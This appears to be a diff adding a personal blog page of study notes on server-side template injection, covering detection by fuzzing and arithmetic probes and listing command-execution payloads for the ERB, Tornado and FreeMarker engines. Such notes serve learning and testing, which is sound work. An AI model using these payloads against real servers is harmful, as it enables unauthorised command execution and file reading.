@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Mi Blog</title>
+  <link rel="stylesheet" href="file:///Users/b0ydc/Documents/CYBER/SITE/css/styles.css">
+</head>
+<body>
+  <header>
+    <h4 align="right">@b0ydC</h4>
+  </header>
+
+  <main>
+    <article>
+     
+<h2>1. GENERAL INFORMATION</h2> 
+
+<code>
+
+first clue is XSS, normally after finding XSS no deep testing is performed and sometimes missed during black box engagements.
+one good way to differentiate if SSTI is possible is to attempt normal/common operations, like sum, multiplication, etc.<br><br>
+
+not only XSS can lead to SSTI, also XXE.<br><br>
+
+typically arises through developers intentionally letting users submit or edit templates - some template engines offer a secure 
+mode for this express purpose.<br><br>
+
+it may occur as a Local File Include (LFI) variant, exploitable through classic LFI techniques such as code embedded in log files, 
+session files, or /proc/self/env
+
+</code>          
+
+<h2>2. IDENTIFICATION</h2> 
+
+<code>
+
+high level<br><br>
+
+- find parameter that reflects<br>
+- test payloads (operational)<br>
+- find the template type/version<br>
+- execute payloads<br><br>
+  
+<u>1. detecting template injection</u><br><br>
+
+Initial approach is to try fuzzing the template by injecting a sequence of special characters commonly used in template expressions, 
+such as &dollar;&lcub;&lcub;&lt;&percnt;&lsqb;&percnt;&apos;&quot;&rcub;&rcub;&percnt;&bsol;&period; If an exception is raised, this 
+indicates that the injected template syntax is potentially being interpreted by the server in some way. <br><br>
+
+Even if fuzzing did suggest a template injection vulnerability, you still need to identify its context in order to exploit it.<br><br>
+
+<u>For plaintext:</u><br><br>
+Normal XSS attempts cannot provide evidence to SSTI, it will be needed some kind of operations, like {7*7}. If the result is 
+49, it means the mathematical operation is evaluated on server side, confirming a potential SSTI vulnerability.<br><br>
+
+<u>For codecontext:</u><br><br>
+It will render using variable/parameter, so one way to test if the template used is vulnerable is to attempt injecting HTML code
+to a non-XSS vulnerable parameter, if it is reflected, it's could means the parameters are vulnerable to SSTI.<br><br>
+
+SAMPLE: http://vulnerable-website.com/?greeting=data.username<tag> | http://vulnerable-website.com/?greeting=data.username<tag><br><br>
+  
+<u>2. detect template engine in use [it differs]</u><br><br>
+
+A common way of doing this is to inject arbitrary mathematical operations using syntax from different template engines.<br><br>
+
+check this site, https://portswigger.net/web-security/server-side-template-injection<br><br>
+
+<u>3. read the documentation</u><br><br>
+
+</code>
+
+<h2>3. TEMPLATES ENGINES</h2> 
+
+<code>          
+
+<u>ERB</u><br><br>
+
+it is pretty important to check the documentation, there you can find the different methods or functions that you can call to make the 
+template execute operations.<br><br>
+  
+common way to test, <%= 7*7 %><br>
+common way to execute arbitrary commands, <%= system("cat /home/user/mo.txt") %><br><br>
+
+<u>TORNADO</u><br><br>
+
+template expressions are surrounded by {}, a simple way to test it is using the following: }}{{7*7}}
+sometimes it is important to make post, or use the site to validate the user and information is valid. <br><br>
+
+<u>execute python in tornado ? how to do that ?</u><br><br>
+
+the "OS" module can be used to run/execute python on a TORNADO template. check the following code to run python.<br>
+you can mix commands to get the desired results, importing the OS module bring the chance to use or call OS commands in general.<br><br>
+
+{% import os %}{{os.system('cat /home/user/mo.txt') <br><br>
+
+ <u>FREEMARKER</u><br><br>
+  
+code execution: <br><br>
+
+<#assign ex = "freemarker.template.utility.Execute"?new()>&dollar;&lcub; ex("id")}<br><br>
+[#assign ex = 'freemarker.template.utility.Execute'?new()]&dollar;&lcub; ex('id')}<br><br>
+&dollar;&lcub;"freemarker.template.utility.Execute"?new()("id")}<br><br>
+#{"freemarker.template.utility.Execute"?new()("id")}<br><br>
+[="freemarker.template.utility.Execute"?new()("id")]
+
+</code>
+
+
+    </article>
+
+
+  </main>
+
+</body>
+</html>
